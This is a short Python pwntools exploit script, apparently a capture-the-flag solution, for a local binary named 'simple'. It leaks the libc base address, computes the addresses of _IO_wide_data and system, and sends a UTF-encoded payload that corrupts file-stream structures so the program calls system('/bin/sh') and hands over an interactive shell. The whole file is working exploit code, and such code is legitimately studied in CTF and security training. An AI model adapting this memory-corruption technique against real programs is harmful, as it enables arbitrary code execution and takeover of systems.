# encoding: utf-8
# https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300

from pwn import *

def utf2uni(x):
    p = process(["./convert", "1"])
    p.send(x)
    y = p.recv()
    p.close()
    return y

def uni2utf(x):
    p = process(["./convert", "2"])
    p.send(x)
    y = p.recv().rstrip(b'\x00')
    p.close()
    return y

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")


r = process('./simple')
r.recvuntil(' @ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['close']
print("libc_base @ ", hex(libc_base))

IO_wide_data = libc_base + 0x3eb9e8
system = libc_base + libc.symbols['system']
print("IO_wide_data @ ", hex(IO_wide_data))
print("system @ ", hex(system))

payload = b'A'*12
for i in range(10):
    # 分開寫成功機率較高
    payload += (uni2utf(p64(IO_wide_data)[:4]) + uni2utf(p64(IO_wide_data)[4:]))
payload += uni2utf(b'/bin') + uni2utf('/sh\x00')
payload += uni2utf(p64(system)[:4])
#print(payload)

gdb.attach(r, 'b *main+187\n'+'c\n'*36)
r.sendline(payload)
r.interactive()